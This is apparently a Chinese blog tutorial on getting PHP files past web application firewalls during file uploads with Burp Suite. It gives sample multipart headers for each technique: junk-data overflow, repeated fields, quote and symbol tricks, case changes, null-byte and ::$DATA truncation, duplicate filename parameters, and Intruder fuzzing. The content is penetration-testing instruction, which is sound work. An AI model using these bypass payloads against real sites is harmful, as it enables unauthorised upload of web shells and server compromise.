# 原创
：  （24）文件上传【绕WAF】【burpsuite才是王道】数据溢出、符号字符变异……

# （24）文件上传【绕WAF】【burpsuite才是王道】数据溢出、符号字符变异……

**目录**

[推荐：](#%E6%8E%A8%E8%8D%90%EF%BC%9A)

[1、Burpsuite好好理解透彻：](#1%E3%80%81Burpsuite%E5%A5%BD%E5%A5%BD%E7%90%86%E8%A7%A3%E9%80%8F%E5%BD%BB%EF%BC%9A)

[2、补充绕过方法：](#2%E3%80%81%E8%A1%A5%E5%85%85%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%EF%BC%9A)

[3、content-type值](#3%E3%80%81content-type%E5%80%BC)

[文件上传利用之绕过WAF](#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8%E4%B9%8B%E7%BB%95%E8%BF%87WAF)

[基本格式：（正常的·）](#%E5%9F%BA%E6%9C%AC%E6%A0%BC%E5%BC%8F%EF%BC%9A%EF%BC%88%E6%AD%A3%E5%B8%B8%E7%9A%84%C2%B7%EF%BC%89)

[抓包后对于数据的处理：](#%E6%8A%93%E5%8C%85%E5%90%8E%E5%AF%B9%E4%BA%8E%E6%95%B0%E6%8D%AE%E7%9A%84%E5%A4%84%E7%90%86%EF%BC%9A)

[数据溢出绕过：](#%E6%95%B0%E6%8D%AE%E6%BA%A2%E5%87%BA%E7%BB%95%E8%BF%87%EF%BC%9A)

[原理：](#%E5%8E%9F%E7%90%86%EF%BC%9A)

[利用过程：](#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B%EF%BC%9A)

[方法一：在content-disposition:字段里写入无用数据（直达WAF检测不出来）](#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E5%9C%A8content-disposition%3A%E5%AD%97%E6%AE%B5%E9%87%8C%E5%86%99%E5%85%A5%E6%97%A0%E7%94%A8%E6%95%B0%E6%8D%AE%EF%BC%88%E7%9B%B4%E8%BE%BEWAF%E6%A3%80%E6%B5%8B%E4%B8%8D%E5%87%BA%E6%9D%A5%EF%BC%89)

[方法二：重复Content-Disposition字段，将恶意文件放在最后（直到绕过WAF）](#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E9%87%8D%E5%A4%8DContent-Disposition%E5%AD%97%E6%AE%B5%EF%BC%8C%E5%B0%86%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E6%94%BE%E5%9C%A8%E6%9C%80%E5%90%8E%EF%BC%88%E7%9B%B4%E5%88%B0%E7%BB%95%E8%BF%87WAF%EF%BC%89)

[方法三：在filename处进行溢出，将恶意文件放在最后（直到绕过WAF）](#%E6%96%B9%E6%B3%95%E4%B8%89%EF%BC%9A%E5%9C%A8filename%E5%A4%84%E8%BF%9B%E8%A1%8C%E6%BA%A2%E5%87%BA%EF%BC%8C%E5%B0%86%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E6%94%BE%E5%9C%A8%E6%9C%80%E5%90%8E%EF%BC%88%E7%9B%B4%E5%88%B0%E7%BB%95%E8%BF%87WAF%EF%BC%89)

[符号变异绕过：](#%E7%AC%A6%E5%8F%B7%E5%8F%98%E5%BC%82%E7%BB%95%E8%BF%87%EF%BC%9A)

[方法一：在filename后面继续添加数据，让WAF认为还没检测完](#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E5%9C%A8filename%E5%90%8E%E9%9D%A2%E7%BB%A7%E7%BB%AD%E6%B7%BB%E5%8A%A0%E6%95%B0%E6%8D%AE%EF%BC%8C%E8%AE%A9WAF%E8%AE%A4%E4%B8%BA%E8%BF%98%E6%B2%A1%E6%A3%80%E6%B5%8B%E5%AE%8C)

[方法二：在filename的引号上做文章](#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E5%9C%A8filename%E7%9A%84%E5%BC%95%E5%8F%B7%E4%B8%8A%E5%81%9A%E6%96%87%E7%AB%A0)

[方法三：尝试加上各种奇怪符号截断WAF的检查](#%E6%96%B9%E6%B3%95%E4%B8%89%EF%BC%9A%E5%B0%9D%E8%AF%95%E5%8A%A0%E4%B8%8A%E5%90%84%E7%A7%8D%E5%A5%87%E6%80%AA%E7%AC%A6%E5%8F%B7%E6%88%AA%E6%96%ADWAF%E7%9A%84%E6%A3%80%E6%9F%A5)

[方法四：在 filename前加上[0x09]](#%E6%96%B9%E6%B3%95%E5%9B%9B%EF%BC%9A%E5%9C%A8%20filename%E5%89%8D%E5%8A%A0%E4%B8%8A%5B0x09%5D)

[字符变异绕过：](#%E5%AD%97%E7%AC%A6%E5%8F%98%E5%BC%82%E7%BB%95%E8%BF%87%EF%BC%9A)

[方法一：Content-Disposition的变量值变异绕过](#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9AContent-Disposition%E7%9A%84%E5%8F%98%E9%87%8F%E5%80%BC%E5%8F%98%E5%BC%82%E7%BB%95%E8%BF%87)

[方法二：后缀名大小写绕过](#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E5%90%8E%E7%BC%80%E5%90%8D%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87)

[数据截断绕过：](#%E6%95%B0%E6%8D%AE%E6%88%AA%E6%96%AD%E7%BB%95%E8%BF%87%EF%BC%9A)

[方法一：将后缀换行，或者使用0x0a换行](#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E5%B0%86%E5%90%8E%E7%BC%80%E6%8D%A2%E8%A1%8C%EF%BC%8C%E6%88%96%E8%80%85%E4%BD%BF%E7%94%A80x0a%E6%8D%A2%E8%A1%8C)

[方法二：%00、0x00、截断](#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%2500%E3%80%810x00%E3%80%81%E6%88%AA%E6%96%AD)

[方法三：::$$DATA数据量绕过](#%E6%96%B9%E6%B3%95%E4%B8%89%EF%BC%9A%3A%3A%24%24DATA%E6%95%B0%E6%8D%AE%E9%87%8F%E7%BB%95%E8%BF%87)

[方法四：在filename中插入无用数据，混淆上传文件](#%E6%96%B9%E6%B3%95%E5%9B%9B%EF%BC%9A%E5%9C%A8filename%E4%B8%AD%E6%8F%92%E5%85%A5%E6%97%A0%E7%94%A8%E6%95%B0%E6%8D%AE%EF%BC%8C%E6%B7%B7%E6%B7%86%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6)

[重复数据绕过：](#%E9%87%8D%E5%A4%8D%E6%95%B0%E6%8D%AE%E7%BB%95%E8%BF%87%EF%BC%9A)

[方法一：重复写一个错误的 filename1](#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E9%87%8D%E5%A4%8D%E5%86%99%E4%B8%80%E4%B8%AA%E9%94%99%E8%AF%AF%E7%9A%84%20filename1)

[方法二：重写filename](#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E9%87%8D%E5%86%99filename)

[Fuzz字典爆破绕过：](#Fuzz%E5%AD%97%E5%85%B8%E7%88%86%E7%A0%B4%E7%BB%95%E8%BF%87%EF%BC%9A)

---


 

## 推荐：

#### 1、Burpsuite好好理解透彻：

[Burpsuite【十二模块一次解决】【这都不看？】Filter、Target、Scanner、Proxy、Intruder、Repeater、Sequencer、Decoder、Comparer…](https://blog.csdn.net/qq_53079406/article/details/123590641?spm=1001.2014.3001.5501)

#### 2、补充绕过方法：

[【后端黑白名单绕过】【WEB 漏洞利用/原理】不懂原理都是没灵魂的方法躯壳？文件上传漏洞利用过程](https://blog.csdn.net/qq_53079406/article/details/123367598?spm=1001.2014.3001.5501)

#### 3、content-type值

[【MIME类型对照】Content-Type的值](https://blog.csdn.net/qq_53079406/article/details/123444997?spm=1001.2014.3001.5501)

 

## 文件上传利用之绕过WAF

现在可能会出现绕过WAF的时间比找漏洞的时间还长，真的是难上加难

### 基本格式：（正常的·）

> 
content-disposition:xxxx; name="upload_file"; filename="xxxx";
content-type: image/jpeg


[【MIME类型对照】Content-Type的值](https://blog.csdn.net/qq_53079406/article/details/123444997?spm=1001.2014.3001.5501)

### 抓包后对于数据的处理：

content-disposition（MIME的扩展，为属性名disposition-type是以什么方式下载）:可更改

name（表单参数值）:别动他，“他有意大利炮”

filename（文件名）：重点针对对象

content-type（Mime值）：结合实际情况盘它

## 数据溢出绕过：

#### 原理：

数据范围都是有限，超过WAF的检测范围就不会往下检测

（就好像前端浏览器输入一样，输入到限制长度就无法再输入，但前端限制可改）

#### 利用过程：

（正常）:

> 
content-disposition:form-data; name="upload_file"; filename="xxxx";
content-type: image/jpeg


#### 方法一：在content-disposition:字段里写入无用数据（直达WAF检测不出来）

可以在form-data前面添加无效数据

> 
**content-disposition:** **form-data  **qwfasajhchsavhjfxjassbchmvjvxevcssasvad hjhegvwchjsvnmcvejgabvxeyfwavcyefwkcbmn hjhegvwchjsvnmcvejgabvxeyfwavcyefwkcbmnsvcyewgchvgegjcbwveyiwcvjsqwfasajhchsav  hjhegvwchjsvnmcvejgabvxeyfwavcyefwkcbmnsvcyewgchvgegjcbwveyiwcvjsqwfasajhchsav hjhegvwchjsvnmcvejgabvxeyfwavcyefwkcbmnsvcyewgchvgegjcbwveyiwcvjs(直达WAF检测不出来)  **form-data; name="upload_file"; filename="xxxx.php";**
**content-type: image/jpeg**


也可以在form-data后面添加无效数据

> 
**content-disposition:** **form-data  **qwfasajhchsavhjfxjassbchmvjvxevcssasvad hjhegvwchjsvnmcvejgabvxeyfwavcyefwkcbmn hjhegvwchjsvnmcvejgabvxeyfwavcyefwkcbmnsvcyewgchvgegjcbwveyiwcvjsqwfasajhchsav hjhegvwchjsvnmcvejgabvxeyfwavcyefwkcbmnsvcyewgchvgegjcbwveyiwcvjsqwfasajhchsav  hjhegvwchjsvnmcvejgabvxeyfwavcyefwkcbmnsvcyewgchvgegjcbwveyiwcvjs(直达WAF检测不出来) **; name="upload_file"; filename="xxxx.php";**
**content-type: image/jpeg**


#### 方法二：重复Content-Disposition字段，将恶意文件放在最后（直到绕过WAF）

> 
content-disposition:form-data; name="upload_file"; filename="xxxx";
content-disposition:form-data; name="upload_file"; filename="xxxx";
……
content-disposition:form-data; name="upload_file"; filename="x.php";
content-type: image/jpeg


#### 方法三：在filename处进行溢出，将恶意文件放在最后（直到绕过WAF）

> 
**content-disposition:form-data; name="upload_file"; filename="**vgdbcshjvebcvhascbwebckjbxc hewvcnx chjevwcj xn cec.xcne ccwe cewkccas e vgdbcshjvebcvhascbwebckjbxc hewvcnx chjevwcj xn cec.xcne ccwe cewkc esavcsaxAC  dvdsce vgdbcshjvebcvhascbwebckjbxc hewvcnx chjevwcj xn cec.xcne ccwe cewkc ecsdv dvdsce vgdbcshjvebcvhascbwebckjbxc hewvcnx chjevwcj xn cec.xcne ccwe cewkc e dvdsc **x.php";**
**content-type: image/jpeg**


 

## 符号变异绕过：

#### 方法一：在filename后面继续添加数据，让WAF认为还没检测完

> 
**content-disposition:form-data; name="upload_file"; filename="x.php";**xxxxxxxxxxxxxx
**content-type: image/jpeg**


#### 方法二：在filename的引号上做文章

去掉一个"，或者删除2个"

(让WAF认为是一个非用户输入的变量)

> 
content-disposition:form-data; name="upload_file"; filename="x.php;
content-type: image/jpeg


改为单引号（WAF可能只检测双引号里面的内容）

> 
content-disposition:form-data; name="upload_file"; filename='x.php';
content-type: image/jpeg


#### 方法三：尝试加上各种奇怪符号截断WAF的检查

但是文件又能被正常执行

> 
content-disposition:form-data; name="upload_file"; filename="**x.jpg;/.php**";
content-type: image/jpeg


> 
content-disposition:form-data; name="upload_file"; filename="**/jpeg;/x.php**";
content-type: image/jpeg


#### 方法四：在 filename前加上[0x09]

> 
content-disposition:form-data; name="upload_file"; filename="[0x09]x.php";
content-type: image/jpeg


 

## 字符变异绕过：

#### 方法一：Content-Disposition的变量值变异绕过

**f+orm-data**

> 
content-disposition:**f+orm-data**; name="upload_file"; filename="x.php";
content-type: image/jpeg


**丢弃掉form-data**

> 
content-disposition: name="upload_file"; filename="x.php";
content-type: image/jpeg


#### 方法二：后缀名大小写绕过

> 
content-disposition:form-data; name="upload_file"; filename="**x.PHp**";
content-type: image/jpeg


## 数据截断绕过：

#### 方法一：将后缀换行，或者使用0x0a换行

> 
content-disposition:form-data; name="upload_file"; filename="x
.
p
h
p";
content-type: image/jpeg


#### 方法二：%00、0x00、截断

在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束

0x开头表示16进制，0在十六进制中是00, 0x00就是%00解码成的16进制

> 
…… filename="x.php%00/.txt"

……filename="x.php%00/.txt"
（可以在上传时多预留了一个空格占位，再改%00和0x0所对应的hex值，从而达到修改）


#### 方法三：::$$DATA数据量绕过

在php文件名后面加上`::$DATA`系统会把它当作文件流来进行处理，不会检测文件的后缀名，且保留::$DATA之前的文件名以及后缀

> 
…… filename="x.php::$$DATA"


#### 方法四：在filename中插入无用数据，混淆上传文件

> 
content-disposition:form-data; name="upload_file"; filename="**content-disposition:form-data;**x.php";
content-type: image/jpeg
(插入混淆数据在里面干扰，误认为x.php没有被接收)


## 重复数据绕过：

（我感觉这个和数据溢出有异曲同工之妙）

#### 方法一：重复写一个错误的 filename1

> 
content-disposition:form-data; name="upload_file";** filename="x.php"; filename1="x.txt";**
content-type: image/jpeg


#### 方法二：重写filename

（以最后一个为准）

> 
content-disposition:form-data; name="upload_file";** filename="x.txt"; filename1="x.txt";filename1="x.txt";……filename1="x.php";**
content-type: image/jpeg


 

## Fuzz字典爆破绕过：

可以使用智能添加payload（有效载荷）位置，也可手动添加

（实战的主要的运用方法，都是迫不得已才用手工）

工根据选择的攻击类型，和有效载荷类型不同，会有不同的效果

有效载荷可以选择Simple list（简单清单）-------&gt;导入自己下载或收集的规则（还可以点击添加，一个一个加上补充的）
